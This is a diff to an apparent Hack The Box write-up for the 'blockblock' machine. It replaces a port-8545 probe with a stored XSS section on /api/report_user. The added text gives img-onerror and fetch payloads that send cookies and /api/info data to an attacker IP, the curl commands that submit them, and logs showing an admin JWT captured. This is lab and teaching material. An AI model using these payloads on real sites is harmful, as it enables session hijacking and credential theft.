@@ -727,32 +727,103 @@ root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token
 }
 ```
 
-#### 2.3.x. Trying `8545`
+### 2.4. Cross-site scripting (XSS) on `/api/report_user`
+
+The action when a user is reported is:
+
+```js
+alert(
+  "Thank you for reporting the user, Our moderators will take action as soon as possible."
+);
+```
+
+#### 2.4.1. Testing for XSS
+
+Start Apache web server and follow (`tail -f`) the `access.log`
 
 ```console
-root@kali:~# curl -v http://blockblock.htb:8545/
-* Host blockblock.htb:8545 was resolved.
-* IPv6: (none)
-* IPv4: 10.10.11.43
-*   Trying 10.10.11.43:8545...
-* Connected to blockblock.htb (10.10.11.43) port 8545
-* using HTTP/1.x
-> GET / HTTP/1.1
-> Host: blockblock.htb:8545
-> User-Agent: curl/8.11.0
-> Accept: */*
->
-* Request completely sent off
-< HTTP/1.1 400 BAD REQUEST
-< Server: Werkzeug/3.0.3 Python/3.12.3
-< Date: Thu, 02 Jan 2025 07:29:07 GMT
-< content-type: text/plain; charset=utf-8
-< Content-Length: 43
-< vary: origin, access-control-request-method, access-control-request-headers
-< access-control-allow-origin: *
-< date: Thu, 02 Jan 2025 07:29:07 GMT
-< Connection: close
-<
-* shutting down connection #0
-Connection header did not include 'upgrade'
+root@kali:~# systemctl start apache2
+
+root@kali:~# tail -f /var/log/apache2/access.log
+```
+
+Test out XSS with below code for the username value:
+
+```html
+<img src=x onerror=this.src='http://10.10.14.44/404.js?'+document.cookie>
+```
+
+Submitting via API (with [URL encoding](https://www.urlencoder.org/) on the value):
+
+```console
+root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -d '{"username": "%3Cimg%20src%3Dx%20onerror%3Dthis.src%3D%27http%3A%2F%2F10.10.14.44%2F404.js%3F%27%2Bdocument.cookie%3E"}' http://blockblock.htb/api/report_user | jq
+{
+  "status": "OK"
+}
+```
+
+The apache access log shows that the target attempted to retrieve `404.js`:
+
+```
+10.10.11.43 - - [02/Jan/2025:22:00:19 +0800] "GET /404.js? HTTP/1.1" 404 490 "http://10.10.11.43/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36"
+```
+
+#### 2.4.2. Retrieve information using XSS
+
+Attempt to get the application to retrieve its own `/api/info` and reflect it to Kali with below code:
+
+```html
+<img src=x onerror="fetch('http://10.10.11.43/api/info').then(response => {return response.json();}).then(dataFromA => {return fetch(`http://10.10.14.44/?d=${dataFromA}`)})">
+```
+
+Submitting via API (with [URL encoding](https://www.urlencoder.org/) on the value):
+
+```console
+root@kali:~# token=$(curl -s -H 'Content-Type: application/json' -d '{"username": "test", "password": "test"}' http://blockblock.htb/api/login | jq -r .'token')
+
+root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -d '{"username": "%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2F10.10.11.43%2Fapi%2Finfo%27%29.then%28response%20%3D%3E%20%7Breturn%20response.json%28%29%3B%7D%29.then%28dataFromA%20%3D%3E%20%7Breturn%20fetch%28%60http%3A%2F%2F10.10.14.44%2F%3Fd%3D%24%7BdataFromA%7D%60%29%7D%29%22%3E"}' http://blockblock.htb/api/report_user | jq
+{
+  "status": "OK"
+}
+```
+
+The reflection seemed to work, but the response is `/?d=[object%20Object]`:
+
+```
+10.10.11.43 - - [02/Jan/2025:22:11:08 +0800] "GET /?d=[object%20Object] HTTP/1.1" 200 3383 "http://10.10.11.43/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36"
+```
+
+#### 2.4.3. Retrieve information using XSS (Correct type now)
+
+The returned `[object Object]` (`%20` is URL-encoded for `space`) may mean that the json object was reflected, let's change the code to get `response.text()` instead:
+
+```html
+<img src=x onerror="fetch('http://10.10.11.43/api/info').then(response => {return response.text();}).then(dataFromA => {return fetch(`http://10.10.14.44/?d=${dataFromA}`)})">
+```
+
+Submitting via API (with [URL encoding](https://www.urlencoder.org/) on the value):
+
+```console
+root@kali:~# token=$(curl -s -H 'Content-Type: application/json' -d '{"username": "test", "password": "test"}' http://blockblock.htb/api/login | jq -r .'token')
+
+root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -d '{"username": "%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2F10.10.11.43%2Fapi%2Finfo%27%29.then%28response%20%3D%3E%20%7Breturn%20response.text%28%29%3B%7D%29.then%28dataFromA%20%3D%3E%20%7Breturn%20fetch%28%60http%3A%2F%2F10.10.14.44%2F%3Fd%3D%24%7BdataFromA%7D%60%29%7D%29%22%3E"}' http://blockblock.htb/api/report_user | jq
+{
+  "status": "OK"
+}
+```
+
+The XSS reflected the admin credentials:
+
+```
+10.10.11.43 - - [02/Jan/2025:22:00:26 +0800] "GET /?d={%22role%22:%22admin%22,%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNTgyNTUxNiwianRpIjoiZGFmMTUyMGQtMGFmYy00ZTI0LWEwMjQtMThjYmVkMjdhZmMyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzM1ODI1NTE2LCJleHAiOjE3MzY0MzAzMTZ9.4R-d08ydPyShr16Jr0QJQi0TXGFRQKS-GoxQqDMUTQ8%22,%22username%22:%22admin%22} HTTP/1.1" 200 3383 "http://10.10.11.43/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36"
+```
+
+URL-decode the string and formatting back with `jq`:
+
+```json
+{
+  "role": "admin",
+  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNTgyNTUxNiwianRpIjoiZGFmMTUyMGQtMGFmYy00ZTI0LWEwMjQtMThjYmVkMjdhZmMyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzM1ODI1NTE2LCJleHAiOjE3MzY0MzAzMTZ9.4R-d08ydPyShr16Jr0QJQi0TXGFRQKS-GoxQqDMUTQ8",
+  "username": "admin"
+}
 ```
